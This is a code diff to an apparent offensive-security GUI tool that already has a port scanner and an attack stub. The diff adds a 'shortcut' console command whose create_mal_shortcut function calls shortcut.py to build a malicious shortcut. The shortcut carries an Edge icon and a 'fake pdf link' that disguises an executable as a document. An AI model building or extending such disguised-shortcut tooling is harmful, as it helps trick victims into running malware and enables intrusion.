@@ -1,9 +1,10 @@
 import json
+import subprocess
 import sys
 import ctypes
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QLabel, QLineEdit, QCheckBox, QTextEdit,
                              QGridLayout, QToolBar, QStatusBar, QTabWidget, QVBoxLayout, QHBoxLayout,
-                             QGroupBox, QFrame, QSplitter, QScrollBar)
+                             QGroupBox, QFrame, QSplitter, QScrollBar, QMessageBox, QInputDialog)
 from PyQt6.QtCore import Qt, QDate, QSize, QFile, QTextStream, QDir
 from PyQt6.QtGui import QFont, QAction, QIcon
 
@@ -57,6 +58,19 @@ class ConsoleTab(QWidget):
     def connectSignals(self):
         self.console_line_input.returnPressed.connect(self.executeCommands)
 
+    def setup_shoot_cut(self):
+        icon, state1 = QInputDialog.getText(self, "Icon ", "Specify and icon")
+        if state1:
+            shortcut_name, state2 = QInputDialog.getText(self, "Name ", "Specify the shortcut name")
+            if state2:
+                fake_pdf_link, state3 = QInputDialog.getText(self, "URL", "Specify the fake pdf link (i.e. "
+                                                                                 "google doc)")
+                if state3:
+                    exec_file, state4 = QInputDialog.getText(self, "Executable Name ", "Specify the executable file name")
+
+                    if state4:
+                        create_mal_shortcut(self, shortcut_name, fake_pdf_link, exec_file)
+
     def executeCommands(self):
         commands = [
             "help",
@@ -99,6 +113,8 @@ class ConsoleTab(QWidget):
             self.clearLineText()
             tree_text = print_table(scan_result)
             self.setOutText(tree_text)
+        elif self.getLineText() == "shortcut":
+            self.setup_shoot_cut()
 
         self.clearLineText()
 
@@ -295,7 +311,25 @@ def scan(target):
     scanner = Scan(target=target)
     return scanner.scan_top_ports()
 
+def create_mal_shortcut(self, shortcut_name, doc_url, exec_name):
+        # Your custom function based on the parameters
+        command = [
+            "python",
+            "shortcut.py",
+            "--icon",
+            "edge",
+            "--name",
+            shortcut_name,
+            "-fp",
+            doc_url,
+            exec_name,
+        ]
 
+        try:
+            subprocess.run(command, check=True)
+            QMessageBox.information(self, "Success", f"Your parameters: {shortcut_name}, {doc_url}, {exec_name}")
+        except subprocess.CalledProcessError as e:
+            QMessageBox.critical(self, "Error", f"Error running command: {e}")
 def attack():
     print("[+] Attack")
 
